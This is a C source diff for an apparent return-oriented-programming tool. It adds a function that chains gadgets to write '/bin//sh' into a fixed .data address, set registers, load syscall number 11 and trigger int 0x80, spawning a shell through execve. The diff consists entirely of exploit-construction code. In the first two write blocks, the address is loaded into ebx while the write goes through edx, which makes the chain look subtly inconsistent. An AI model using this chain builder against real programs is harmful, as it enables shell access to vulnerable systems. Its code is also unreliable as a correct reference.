@@ -10,13 +10,7 @@ int rop_chain(unsigned char *binary, unsigned long binary_len)
         return -1;
     }
     rop_chain_list_init(head);
-    rop_find_gadgets("pop", "eax", head, binary, binary_len);
-    rop_find_gadgets("pop", "ebx", head, binary, binary_len);
-    rop_find_gadgets("pop", "ecx", head, binary, binary_len);
-    rop_find_gadgets("pop", "edx", head, binary, binary_len);
-    rop_find_gadgets("xor", "eax, eax", head, binary, binary_len);
-    rop_find_gadgets("int", "0x80", head, binary, binary_len);
-
+    rop_chain_payload(head, binary, binary_len);
     rop_chain_list_traverse(head);
     return 0;
 }
@@ -68,6 +62,39 @@ int rop_find_gadgets(char* operate, char* operand, struct Gadget *head, unsigned
     return -1;
 }
 
+int rop_chain_payload(struct Gadget *head, unsigned char *binary, unsigned long binary_len)
+{
+    rop_find_gadgets("pop", "ebx", head, binary, binary_len);
+    rop_chain_list_add(head, 0x080ef060, "@. data");
+    rop_find_gadgets("pop", "eax", head, binary, binary_len);
+    rop_chain_list_add(head, 0x6e69622f, "/bin");
+    rop_find_gadgets("mov", "dword ptr [edx], eax", head, binary, binary_len);
+
+    rop_find_gadgets("pop", "ebx", head, binary, binary_len);
+    rop_chain_list_add(head, 0x080ef064, "@. data + 4");
+    rop_find_gadgets("pop", "eax", head, binary, binary_len);
+    rop_chain_list_add(head, 0x68732f2f, "//sh");
+    rop_find_gadgets("mov", "dword ptr [edx], eax", head, binary, binary_len);
+
+    rop_find_gadgets("pop", "edx", head, binary, binary_len);
+    rop_chain_list_add(head, 0x080ef068, "@. data + 8");
+    rop_find_gadgets("xor", "eax, eax", head, binary, binary_len);
+    rop_find_gadgets("mov", "dword ptr [edx], eax", head, binary, binary_len);
+
+    rop_find_gadgets("pop", "ebx", head, binary, binary_len);
+    rop_chain_list_add(head, 0x080ef060, "@. data");
+    rop_find_gadgets("pop", "ecx", head, binary, binary_len);
+    rop_chain_list_add(head, 0x080ef068, "@. data + 8");
+    rop_find_gadgets("pop", "edx", head, binary, binary_len);
+    rop_chain_list_add(head, 0x080ef068, "@. data + 8");
+
+    rop_find_gadgets("xor", "eax, eax", head, binary, binary_len);
+    size_t i;
+    for(i = 0; i < 11; i++)
+        rop_find_gadgets("inc", "eax", head, binary, binary_len);
+    rop_find_gadgets("int", "0x80", head, binary, binary_len);
+    return 0;
+}
 
 void rop_chain_list_init(struct Gadget *head)
 {
